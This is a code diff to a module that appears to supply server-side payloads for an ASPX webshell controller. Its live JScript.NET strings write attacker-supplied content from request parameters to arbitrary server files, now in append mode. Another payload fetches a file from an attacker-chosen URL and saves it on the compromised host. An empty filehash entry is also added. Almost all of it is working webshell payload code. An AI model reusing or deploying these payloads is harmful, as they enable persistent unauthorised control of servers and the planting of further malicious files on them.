@@ -37,14 +37,14 @@ module.exports = (arg1, arg2, arg3) => ({
 
   upload_file: {
     _:
-      // `var
-      // P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.C
-      // onvert.FromBase64String(Request.Item["${arg1}"].substr(#randomPrefix#)));var
-      // Z:String=Request.Item["${arg2}"].substr(#randomPrefix#);var B:byte[]=new byte[Z.Length/2];for(var
-      // i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var
-      // fs:System.IO.FileStream=new
-      // System.IO.FileStream(P,System.IO.FileMode.Create);fs.Write(B,0,B.Length);fs.Cl
-      // ose();Response.Write("1");`, 修改写入模式Create->Append
+    // `var
+    // P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.C
+    // onvert.FromBase64String(Request.Item["${arg1}"].substr(#randomPrefix#)));var
+    // Z:String=Request.Item["${arg2}"].substr(#randomPrefix#);var B:byte[]=new byte[Z.Length/2];for(var
+    // i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var
+    // fs:System.IO.FileStream=new
+    // System.IO.FileStream(P,System.IO.FileMode.Create);fs.Write(B,0,B.Length);fs.Cl
+    // ose();Response.Write("1");`, 修改写入模式Create->Append
       `var P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"].substr(#randomPrefix#)));var Z:String=Request.Item["${arg2}"];var B:byte[]=new byte[Z.Length/2];for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Append);fs.Write(B,0,B.Length);fs.Close();Response.Write("1");`,
     [arg1]: "#{newbase64::path}",
     [arg2]: "#{buffer::content}"
@@ -71,5 +71,10 @@ module.exports = (arg1, arg2, arg3) => ({
     _: `var X=new ActiveXObject("Microsoft.XMLHTTP");var S=new ActiveXObject("Adodb.Stream");S.Type=1;S.Mode=3;S.Open();X.Open("GET",System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"].substr(#randomPrefix#))),false);X.Send();S.Write(X.ResponseBody);S.Position=0;S.SaveToFile(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"].substr(#randomPrefix#))),2);S.close;S=null;X=null;Response.Write("1");`,
     [arg1]: "#{newbase64::url}",
     [arg2]: "#{newbase64::path}"
-  }
+  },
+
+  filehash: {
+    _: ``.replace(/\n\s+/g, ''),
+    [arg1]: '#{newbase64::path}',
+  },
 })
